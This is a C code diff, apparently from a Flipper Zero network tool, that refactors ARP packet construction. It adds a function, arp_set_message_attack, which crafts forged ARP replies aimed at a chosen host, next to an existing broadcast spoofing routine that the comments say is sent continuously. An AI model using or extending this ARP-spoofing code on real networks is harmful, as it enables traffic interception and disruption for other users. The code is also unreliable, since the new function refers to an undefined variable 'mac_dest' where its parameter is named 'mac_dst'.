@@ -47,10 +47,28 @@ void set_arp_message_for_attack_all(
     set_ethernet_header(buffer, MAC, MAC_BROADCAST, 0x806);
 
     // For the ArpSpoofing we need to send this continuosly
-    arp_set_header_ipv4(
+    arp_set_header(
         buffer + ETHERNET_HEADER_LEN, MAC, MAC_BROADCAST, ip_for_router, IP_BROADCAST, 0x0002);
 
     // Set the length of the message
+    *len = ETHERNET_HEADER_LEN + ARP_LEN;
+}
+
+/**
+ * Function to set the attack to the specific IP
+ */
+
+void arp_set_message_attack(
+    uint8_t* buffer,
+    uint8_t* ip_src,
+    uint8_t* mac_src,
+    uint8_t* ip_dst,
+    uint8_t* mac_dst,
+    uint16_t* len) {
+    set_ethernet_header(buffer, mac_src, mac_dst, 0x806);
+
+    arp_set_header(buffer + ETHERNET_HEADER_LEN, mac_src, mac_dest, ip_src, ip_dst, 0x0002);
+
     *len = ETHERNET_HEADER_LEN + ARP_LEN;
 }
 
@@ -81,8 +99,7 @@ bool set_arp_request(uint8_t* buffer, uint16_t* len, uint8_t* target_ip) {
 
     // Set up ARP header
     // ARP operation code 1 = request
-    if(!arp_set_header_ipv4(
-           buffer + ETHERNET_HEADER_LEN, my_mac, MAC_BROADCAST, my_ip, target_ip, 1)) {
+    if(!arp_set_header(buffer + ETHERNET_HEADER_LEN, my_mac, MAC_BROADCAST, my_ip, target_ip, 1)) {
         return false;
     }
 
@@ -309,7 +326,7 @@ bool arp_get_specific_mac(enc28j60_t* ethernet, uint8_t* src_ip, uint8_t* dst_ip
             }
         }
 
-        furi_delay_ms(1);
+        furi_delay_us(1);
     }
     // disable_promiscuous(ethernet);
 
